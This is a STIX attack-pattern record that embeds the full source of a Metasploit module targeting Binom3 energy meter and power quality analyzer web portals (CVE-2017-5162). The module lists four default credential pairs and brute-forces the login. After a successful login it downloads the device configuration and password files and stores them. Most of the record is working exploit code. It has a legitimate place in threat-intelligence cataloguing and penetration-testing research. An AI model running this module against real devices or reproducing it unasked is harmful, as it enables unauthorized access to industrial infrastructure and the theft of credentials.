{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2e9014aa-d549-440b-8874-dc4111691554",
    "created": "2024-08-14T16:31:09.927458Z",
    "modified": "2024-08-14T16:31:09.927462Z",
    "name": "Binom3 Web Management Login Scanner, Config and Password File Dump",
    "description": " This module scans for Binom3 Multifunctional Revenue Energy Meter and Power Quality Analyzer management login portal(s), and attempts to identify valid credentials. There are four (4) default accounts - 'root'/'root', 'admin'/'1', 'alg'/'1', 'user'/'1'. In addition to device config, 'root' user can also access password file. Other users - admin, alg, user - can only access configuration file. The module attempts to download configuration and password files depending on the login user credentials found.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/binom3_login_config_pass_dump.rb",
            "external_id": "binom3_login_config_pass_dump.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-5162"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name' => 'Binom3 Web Management Login Scanner, Config and Password File Dump',\n      'Description' => %{\n          This module scans for Binom3 Multifunctional Revenue Energy Meter and Power Quality Analyzer\n          management login portal(s), and attempts to identify valid credentials.\n          There are four (4) default accounts - 'root'/'root', 'admin'/'1', 'alg'/'1', 'user'/'1'.\n          In addition to device config, 'root' user can also access password file.\n          Other users - admin, alg, user - can only access configuration file.\n          The module attempts to download configuration and password files depending on the login user credentials found.\n      },\n      'References' =>\n        [\n          ['URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-17-031-01A'],\n          ['CVE', '2017-5162']\n        ],\n      'Author' =>\n        [\n          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'\n        ],\n      'License' => MSF_LICENSE,\n      'DefaultOptions' => { 'VERBOSE' => true })\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\t# Application may run on a different port too. Change port accordingly.\n        OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'root']),\n        OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'root'])\n      ], self.class\n    )\n  end\n\n  def run_host(ip)\n    unless is_app_binom3?\n      return\n    end\n\n    each_user_pass do |user, pass|\n      do_login(user, pass)\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  #\n  # Check if App is Binom3\n  #\n\n  def is_app_binom3?\n    begin\n      res = send_request_cgi(\n        {\n          'uri' => '/',\n          'method' => 'GET'\n        }\n      )\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE\n      print_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")\n      return false\n    end\n\n    if (res && res.code == 200 && res.headers['Server'] && (res.headers['Server'].include?('Team-R Web') || res.body.include?('binom_ico') || res.body.include?('team-r')))\n\n      print_good(\"#{rhost}:#{rport} - Binom3 confirmed...\")\n\n      return true\n    else\n      print_error(\"#{rhost}:#{rport} - Application does not appear to be Binom3. Module will not continue.\")\n      return false\n    end\n  end\n\n  #\n  # Brute-force the login page\n  #\n\n  def do_login(user, pass)\n    print_status(\"#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}\")\n    begin\n\n      res = send_request_cgi(\n        {\n          'uri' => '/~login',\n          'method' => 'POST',\n          'headers' => { 'Content-Type' => 'application/x-www-form-urlencoded' },\n          'vars_post' =>\n            {\n              'login' => user,\n              'password' => pass\n            }\n        }\n      )\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE\n\n      vprint_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")\n      return :abort\n\n    end\n\n    if (res && res.code == 302 && res.get_cookies.include?('IDSESSION'))\n\n      print_good(\"SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}\")\n\n      report_cred(\n        ip: rhost,\n        port: rport,\n        service_name: 'Binom3',\n        user: user,\n        password: pass\n      )\n\n      # Set Cookie\n\n      get_cookie = res.get_cookies\n      cookie = get_cookie + ' NO-HELP=true; onlyRu=1'\n\n      # Attempting to download config file\n\n      config_uri = '~cfg_ask_xml?type=cfg'\n\n      res = send_request_cgi({ 'method' => 'GET', 'uri' => config_uri, 'cookie' => cookie })\n\n      if res && res.code == 200\n        vprint_status('++++++++++++++++++++++++++++++++++++++')\n        vprint_status(\"#{rhost} - dumping configuration\")\n        vprint_status('++++++++++++++++++++++++++++++++++++++')\n\n        print_good(\"#{rhost}:#{rport} - Configuration file retrieved successfully!\")\n        path = store_loot(\n          'Binom3_config',\n          'text/xml',\n          rhost,\n          res.body,\n          rport,\n          'Binom3 device config'\n        )\n        print_status(\"#{rhost}:#{rport} - Configuration file saved in: #{path}\")\n      else\n        print_error(\"#{rhost}:#{rport} - Failed to retrieve configuration\")\n        return\n      end\n\n      # Attempt to dump password file\n      config_uri = '~cfg_ask_xml?type=passw'\n      res = send_request_cgi({ 'method' => 'GET', 'uri' => config_uri, 'cookie' => cookie })\n\n      if res && res.code == 200\n        vprint_status('++++++++++++++++++++++++++++++++++++++')\n        vprint_status(\"#{rhost} - dumping password file\")\n        vprint_status('++++++++++++++++++++++++++++++++++++++')\n\n        print_good(\"#{rhost}:#{rport} - Password file retrieved successfully!\")\n        path = store_loot(\n          'Binom3_passw',\n          'text/xml',\n          rhost,\n          res.body,\n          rport,\n          'Binom3 device config'\n        )\n        print_status(\"#{rhost}:#{rport} - Password file saved in: #{path}\")\n      else\n        return\n      end\n    else\n      print_error(\"FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}